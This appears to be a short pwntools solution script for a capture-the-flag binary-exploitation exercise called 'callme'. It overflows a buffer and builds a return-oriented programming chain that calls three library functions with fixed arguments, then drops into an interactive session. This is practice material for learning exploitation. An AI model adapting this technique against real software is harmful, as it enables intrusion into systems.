from pwn import *
import sys

# nm callme | grep ' t '
# 00000000004008f2 t usefulFunction
# 000000000040093c t usefulGadgets

binary = './callme'
if len(sys.argv) == 2:
    r = gdb.debug([binary], '''
    b *0x4008f1
    ''')
else:
    r = process([binary])


arg1 = 0xdeadbeefdeadbeef
arg2 = 0xcafebabecafebabe
arg3 = 0xd00df00dd00df00d
args = p64(arg1) + p64(arg2) + p64(arg3)

pop_rdi_rsi_rdx = 0x40093c
ret_addr = 0x40093f

callme_one = 0x400720
callme_two = 0x400740
callme_three = 0x4006f0

chain = p64(pop_rdi_rsi_rdx) + args + p64(callme_one)
chain += p64(pop_rdi_rsi_rdx) + args + p64(callme_two)
chain += p64(pop_rdi_rsi_rdx) + args + p64(callme_three)

payload = 'A' * cyclic_find('kaaalaaa') + chain
r.sendline(payload)

r.interactive()

